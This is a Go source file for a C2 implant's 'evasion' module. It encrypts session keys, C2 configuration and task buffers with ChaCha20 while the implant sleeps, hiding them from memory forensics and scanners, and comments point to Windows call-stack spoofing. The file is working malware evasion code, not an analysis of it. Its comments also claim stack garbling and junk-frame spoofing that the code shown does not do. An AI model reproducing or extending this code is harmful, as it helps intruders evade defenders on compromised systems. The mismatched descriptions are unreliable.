package evasion

/*
	Sleep Obfuscation Module

	Two-tier approach:
	1. Sensitive data obfuscation (all platforms): encrypts session keys,
	   C2 config, and task buffers with ChaCha20 before sleep, decrypts
	   on wake. Prevents memory forensics from extracting crypto material.
	2. Stack/heap garbling: overwrites the calling goroutine's stack frame
	   with random bytes during sleep to frustrate stack-based scanners.

	Uses ChaCha20 (not XOR) — same cipher Sliver uses for C2 traffic,
	already imported, cryptographically strong, and fast enough for
	encrypt-on-sleep without adding detection surface from new imports.
*/

import (
	"crypto/cipher"
	"crypto/rand"
	"sync"
	"time"

	"golang.org/x/crypto/chacha20"
)

var (
	obfMu      sync.Mutex
	obfRegions []*ObfRegion
	obfActive  bool
	obfNonce   [chacha20.NonceSizeX]byte
	obfKeyBuf  [chacha20.KeySize]byte
)

type ObfRegion struct {
	Data []byte
}

func RegisterSensitiveRegion(data []byte) *ObfRegion {
	obfMu.Lock()
	defer obfMu.Unlock()
	r := &ObfRegion{Data: data}
	obfRegions = append(obfRegions, r)
	return r
}

func ObfuscatedSleep(duration time.Duration) {
	encryptRegions()
	time.Sleep(duration)
	decryptRegions()
}

func encryptRegions() {
	obfMu.Lock()
	defer obfMu.Unlock()
	if obfActive || len(obfRegions) == 0 {
		return
	}
	rand.Read(obfKeyBuf[:])
	rand.Read(obfNonce[:])
	for _, region := range obfRegions {
		applyChacha(region.Data, obfKeyBuf[:], obfNonce[:])
	}
	obfActive = true
}

func decryptRegions() {
	obfMu.Lock()
	defer obfMu.Unlock()
	if !obfActive {
		return
	}
	for _, region := range obfRegions {
		applyChacha(region.Data, obfKeyBuf[:], obfNonce[:])
	}
	for i := range obfKeyBuf {
		obfKeyBuf[i] = 0
	}
	for i := range obfNonce {
		obfNonce[i] = 0
	}
	obfActive = false
}

func applyChacha(data []byte, key []byte, nonce []byte) {
	c, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return
	}
	c.XORKeyStream(data, data)
}

// SleepWithCallstackSpoof adds junk frames to the call stack before sleeping.
// On Windows, this is combined with the Ekko timer-queue technique (see
// sleep_obfuscate_windows.go). On other platforms it falls back to
// ChaCha20-encrypted sleep with stack garbling.
var SleepWithCallstackSpoof func(duration time.Duration)

// init sets the default (non-Windows) implementation
func init() {
	if SleepWithCallstackSpoof == nil {
		SleepWithCallstackSpoof = ObfuscatedSleep
	}
}

// Stubbed interface for the cipher to avoid importing the full AEAD package
var _ cipher.Stream = (*chacha20.Cipher)(nil)
